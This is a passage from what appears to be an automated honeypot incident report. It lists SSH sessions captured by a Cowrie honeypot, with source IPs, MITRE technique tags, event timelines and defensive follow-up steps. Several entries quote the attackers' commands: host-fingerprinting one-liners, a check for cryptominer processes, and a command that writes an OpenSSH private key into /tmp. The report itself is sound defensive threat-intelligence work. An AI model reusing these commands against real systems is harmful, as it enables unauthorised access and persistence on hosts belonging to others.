| `2026-08-25 06:04:27` | `cowrie.client.kex` |
| `2026-08-25 06:04:27` | `cowrie.login.success` |
| `2026-08-25 06:04:28` | `cowrie.direct-tcpip.request` |
| `2026-08-25 06:04:28` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 06:04:28` | `cowrie.direct-tcpip.data` |
| `2026-08-25 06:04:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8f4d19a13e4

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 06:06 |
| **Last Seen** | 2026-08-25 06:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:06:10` | `cowrie.session.connect` |
| `2026-08-25 06:06:11` | `cowrie.client.version` |
| `2026-08-25 06:06:11` | `cowrie.client.kex` |
| `2026-08-25 06:06:12` | `cowrie.login.success` |
| `2026-08-25 06:06:14` | `cowrie.session.params` |
| `2026-08-25 06:06:14` | `cowrie.command.input` |
| `2026-08-25 06:06:14` | `cowrie.command.input` |
| `2026-08-25 06:06:14` | `cowrie.command.input` |
| `2026-08-25 06:06:14` | `cowrie.command.input` |
| `2026-08-25 06:06:14` | `cowrie.command.input` |
| `2026-08-25 06:06:14` | `cowrie.command.success` |
| `2026-08-25 06:06:14` | `cowrie.command.input` |
| `2026-08-25 06:06:14` | `cowrie.command.input` |
| `2026-08-25 06:06:14` | `cowrie.command.input` |
| `2026-08-25 06:06:14` | `cowrie.command.input` |
| `2026-08-25 06:06:15` | `cowrie.log.closed` |
| `2026-08-25 06:06:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73868432d45b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 06:08 |
| **Last Seen** | 2026-08-25 06:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:08:20` | `cowrie.session.connect` |
| `2026-08-25 06:08:20` | `cowrie.client.version` |
| `2026-08-25 06:08:20` | `cowrie.client.kex` |
| `2026-08-25 06:08:22` | `cowrie.login.success` |
| `2026-08-25 06:08:24` | `cowrie.session.params` |
| `2026-08-25 06:08:24` | `cowrie.command.input` |
| `2026-08-25 06:08:24` | `cowrie.command.input` |
| `2026-08-25 06:08:24` | `cowrie.command.input` |
| `2026-08-25 06:08:24` | `cowrie.command.input` |
| `2026-08-25 06:08:24` | `cowrie.command.input` |
| `2026-08-25 06:08:24` | `cowrie.command.success` |
| `2026-08-25 06:08:24` | `cowrie.command.input` |
| `2026-08-25 06:08:24` | `cowrie.command.input` |
| `2026-08-25 06:08:24` | `cowrie.command.input` |
| `2026-08-25 06:08:24` | `cowrie.command.input` |
| `2026-08-25 06:08:24` | `cowrie.log.closed` |
| `2026-08-25 06:08:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e767a8eeb14f

| Field | Detail |
|---|---|
| **Source IP** | `84.217.31[.]52` |
| **First Seen** | 2026-08-25 06:09 |
| **Last Seen** | 2026-08-25 06:10 |
| **Session Duration** | 32s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:09:53` | `cowrie.session.connect` |
| `2026-08-25 06:09:53` | `cowrie.client.version` |
| `2026-08-25 06:09:53` | `cowrie.client.kex` |
| `2026-08-25 06:09:54` | `cowrie.login.failed` |
| `2026-08-25 06:09:55` | `cowrie.login.success` |
| `2026-08-25 06:09:56` | `cowrie.session.params` |
| `2026-08-25 06:09:56` | `cowrie.command.input` |
| `2026-08-25 06:09:56` | `cowrie.command.failed` |
| `2026-08-25 06:09:56` | `cowrie.log.closed` |
| `2026-08-25 06:09:57` | `cowrie.session.params` |
| `2026-08-25 06:09:57` | `cowrie.command.input` |
| `2026-08-25 06:09:57` | `cowrie.log.closed` |
| `2026-08-25 06:09:58` | `cowrie.session.params` |
| `2026-08-25 06:09:58` | `cowrie.command.input` |
| `2026-08-25 06:09:58` | `cowrie.log.closed` |
| `2026-08-25 06:09:59` | `cowrie.session.params` |
| `2026-08-25 06:09:59` | `cowrie.command.input` |
| `2026-08-25 06:09:59` | `cowrie.log.closed` |
| `2026-08-25 06:09:59` | `cowrie.session.params` |
| `2026-08-25 06:09:59` | `cowrie.command.input` |
| `2026-08-25 06:10:00` | `cowrie.log.closed` |
| `2026-08-25 06:10:00` | `cowrie.session.params` |
| `2026-08-25 06:10:00` | `cowrie.command.input` |
| `2026-08-25 06:10:01` | `cowrie.log.closed` |
| `2026-08-25 06:10:01` | `cowrie.session.params` |
| `2026-08-25 06:10:01` | `cowrie.command.input` |
| `2026-08-25 06:10:01` | `cowrie.log.closed` |
| `2026-08-25 06:10:02` | `cowrie.session.params` |
| `2026-08-25 06:10:02` | `cowrie.command.input` |
| `2026-08-25 06:10:02` | `cowrie.log.closed` |
| `2026-08-25 06:10:03` | `cowrie.session.params` |
| `2026-08-25 06:10:03` | `cowrie.command.input` |
| `2026-08-25 06:10:03` | `cowrie.log.closed` |
| `2026-08-25 06:10:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.217.31[.]52` to AbuseIPDB if not already reported
- [ ] Block `84.217.31[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b41d55830d3c

| Field | Detail |
|---|---|
| **Source IP** | `47.77.182[.]54` |
| **First Seen** | 2026-08-25 06:10 |
| **Last Seen** | 2026-08-25 06:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:10:09` | `cowrie.session.connect` |
| `2026-08-25 06:10:09` | `cowrie.client.version` |
| `2026-08-25 06:10:09` | `cowrie.client.kex` |
| `2026-08-25 06:10:09` | `cowrie.login.success` |
| `2026-08-25 06:10:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.77.182[.]54` to AbuseIPDB if not already reported
- [ ] Block `47.77.182[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f1d634db565

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-25 06:10 |
| **Last Seen** | 2026-08-25 06:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:10:09` | `cowrie.session.connect` |
| `2026-08-25 06:10:09` | `cowrie.client.version` |
| `2026-08-25 06:10:09` | `cowrie.client.kex` |
| `2026-08-25 06:10:10` | `cowrie.login.success` |
| `2026-08-25 06:10:11` | `cowrie.session.params` |
| `2026-08-25 06:10:11` | `cowrie.command.input` |
| `2026-08-25 06:10:11` | `cowrie.session.file_download` |
| `2026-08-25 06:10:11` | `cowrie.session.file_download` |
| `2026-08-25 06:10:11` | `cowrie.log.closed` |
| `2026-08-25 06:10:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5687c02230b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 06:10 |
| **Last Seen** | 2026-08-25 06:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:10:28` | `cowrie.session.connect` |
| `2026-08-25 06:10:28` | `cowrie.client.version` |
| `2026-08-25 06:10:28` | `cowrie.client.kex` |
| `2026-08-25 06:10:30` | `cowrie.login.success` |
| `2026-08-25 06:10:32` | `cowrie.session.params` |
| `2026-08-25 06:10:32` | `cowrie.command.input` |
| `2026-08-25 06:10:32` | `cowrie.command.input` |
| `2026-08-25 06:10:32` | `cowrie.command.input` |
| `2026-08-25 06:10:32` | `cowrie.command.input` |
| `2026-08-25 06:10:32` | `cowrie.command.input` |
| `2026-08-25 06:10:32` | `cowrie.command.success` |
| `2026-08-25 06:10:32` | `cowrie.command.input` |
| `2026-08-25 06:10:32` | `cowrie.command.input` |
| `2026-08-25 06:10:32` | `cowrie.command.input` |
| `2026-08-25 06:10:32` | `cowrie.command.input` |
| `2026-08-25 06:10:32` | `cowrie.log.closed` |
| `2026-08-25 06:10:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cd273fa4c99

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 06:12 |
| **Last Seen** | 2026-08-25 06:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:12:38` | `cowrie.session.connect` |
| `2026-08-25 06:12:38` | `cowrie.client.version` |
| `2026-08-25 06:12:38` | `cowrie.client.kex` |
| `2026-08-25 06:12:40` | `cowrie.login.success` |
| `2026-08-25 06:12:41` | `cowrie.session.params` |
| `2026-08-25 06:12:41` | `cowrie.command.input` |
| `2026-08-25 06:12:41` | `cowrie.command.input` |
| `2026-08-25 06:12:41` | `cowrie.command.input` |
| `2026-08-25 06:12:41` | `cowrie.command.input` |
| `2026-08-25 06:12:41` | `cowrie.command.input` |
| `2026-08-25 06:12:41` | `cowrie.command.success` |
| `2026-08-25 06:12:41` | `cowrie.command.input` |
| `2026-08-25 06:12:41` | `cowrie.command.input` |
| `2026-08-25 06:12:41` | `cowrie.command.input` |
| `2026-08-25 06:12:41` | `cowrie.command.input` |
| `2026-08-25 06:12:42` | `cowrie.log.closed` |
| `2026-08-25 06:12:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b8d85673202

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 06:14 |
| **Last Seen** | 2026-08-25 06:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:14:07` | `cowrie.session.connect` |
| `2026-08-25 06:14:07` | `cowrie.client.version` |
| `2026-08-25 06:14:07` | `cowrie.client.kex` |
| `2026-08-25 06:14:08` | `cowrie.login.success` |
| `2026-08-25 06:14:08` | `cowrie.direct-tcpip.request` |
| `2026-08-25 06:14:09` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 06:14:09` | `cowrie.direct-tcpip.data` |
| `2026-08-25 06:14:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b301030efbd

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 06:14 |
| **Last Seen** | 2026-08-25 06:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:14:11` | `cowrie.session.connect` |
| `2026-08-25 06:14:11` | `cowrie.client.version` |
| `2026-08-25 06:14:11` | `cowrie.client.kex` |
| `2026-08-25 06:14:12` | `cowrie.login.success` |
| `2026-08-25 06:14:12` | `cowrie.direct-tcpip.request` |
| `2026-08-25 06:14:12` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 06:14:12` | `cowrie.direct-tcpip.data` |
| `2026-08-25 06:14:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a366adce4a52

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-25 06:21 |
| **Last Seen** | 2026-08-25 06:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:21:36` | `cowrie.session.connect` |
| `2026-08-25 06:21:36` | `cowrie.client.version` |
| `2026-08-25 06:21:36` | `cowrie.client.kex` |
| `2026-08-25 06:21:37` | `cowrie.login.success` |
| `2026-08-25 06:21:37` | `cowrie.direct-tcpip.request` |
| `2026-08-25 06:21:37` | `cowrie.direct-tcpip.data` |
| `2026-08-25 06:21:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4478a93b98e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 06:23 |
| **Last Seen** | 2026-08-25 06:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:23:43` | `cowrie.session.connect` |
| `2026-08-25 06:23:43` | `cowrie.client.version` |
| `2026-08-25 06:23:43` | `cowrie.client.kex` |
| `2026-08-25 06:23:44` | `cowrie.login.success` |
| `2026-08-25 06:23:44` | `cowrie.direct-tcpip.request` |
| `2026-08-25 06:23:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 06:23:44` | `cowrie.direct-tcpip.data` |
| `2026-08-25 06:23:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f606be4fba22

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 06:23 |
| **Last Seen** | 2026-08-25 06:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:23:46` | `cowrie.session.connect` |
| `2026-08-25 06:23:46` | `cowrie.client.version` |
| `2026-08-25 06:23:47` | `cowrie.client.kex` |
| `2026-08-25 06:23:47` | `cowrie.login.success` |
| `2026-08-25 06:23:48` | `cowrie.direct-tcpip.request` |
| `2026-08-25 06:23:48` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 06:23:48` | `cowrie.direct-tcpip.data` |
| `2026-08-25 06:23:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e471a87de583

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 06:33 |
| **Last Seen** | 2026-08-25 06:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:33:23` | `cowrie.session.connect` |
| `2026-08-25 06:33:23` | `cowrie.client.version` |
| `2026-08-25 06:33:23` | `cowrie.client.kex` |
| `2026-08-25 06:33:24` | `cowrie.login.success` |
| `2026-08-25 06:33:24` | `cowrie.direct-tcpip.request` |
| `2026-08-25 06:33:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 06:33:24` | `cowrie.direct-tcpip.data` |
| `2026-08-25 06:33:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f752968629b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 06:33 |
| **Last Seen** | 2026-08-25 06:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:33:27` | `cowrie.session.connect` |
| `2026-08-25 06:33:27` | `cowrie.client.version` |
| `2026-08-25 06:33:27` | `cowrie.client.kex` |
| `2026-08-25 06:33:28` | `cowrie.login.success` |
| `2026-08-25 06:33:28` | `cowrie.direct-tcpip.request` |
| `2026-08-25 06:33:28` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 06:33:28` | `cowrie.direct-tcpip.data` |
| `2026-08-25 06:33:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dc1d1043c5e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-25 06:42 |
| **Last Seen** | 2026-08-25 06:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:42:13` | `cowrie.session.connect` |
| `2026-08-25 06:42:14` | `cowrie.client.version` |
| `2026-08-25 06:42:14` | `cowrie.client.kex` |
| `2026-08-25 06:42:16` | `cowrie.login.success` |
| `2026-08-25 06:42:17` | `cowrie.session.params` |
| `2026-08-25 06:42:17` | `cowrie.command.input` |
| `2026-08-25 06:42:17` | `cowrie.command.input` |
| `2026-08-25 06:42:17` | `cowrie.command.input` |
| `2026-08-25 06:42:17` | `cowrie.command.input` |
| `2026-08-25 06:42:17` | `cowrie.command.input` |
| `2026-08-25 06:42:17` | `cowrie.command.success` |
| `2026-08-25 06:42:17` | `cowrie.command.input` |
| `2026-08-25 06:42:17` | `cowrie.command.input` |
| `2026-08-25 06:42:17` | `cowrie.command.input` |
| `2026-08-25 06:42:17` | `cowrie.command.input` |
| `2026-08-25 06:42:18` | `cowrie.log.closed` |
| `2026-08-25 06:42:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-440b87123bc6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 06:43 |
| **Last Seen** | 2026-08-25 06:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:43:06` | `cowrie.session.connect` |
| `2026-08-25 06:43:06` | `cowrie.client.version` |
| `2026-08-25 06:43:06` | `cowrie.client.kex` |
| `2026-08-25 06:43:07` | `cowrie.login.success` |
| `2026-08-25 06:43:07` | `cowrie.direct-tcpip.request` |
| `2026-08-25 06:43:07` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 06:43:07` | `cowrie.direct-tcpip.data` |
| `2026-08-25 06:43:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5843134b8375

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 06:43 |
| **Last Seen** | 2026-08-25 06:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
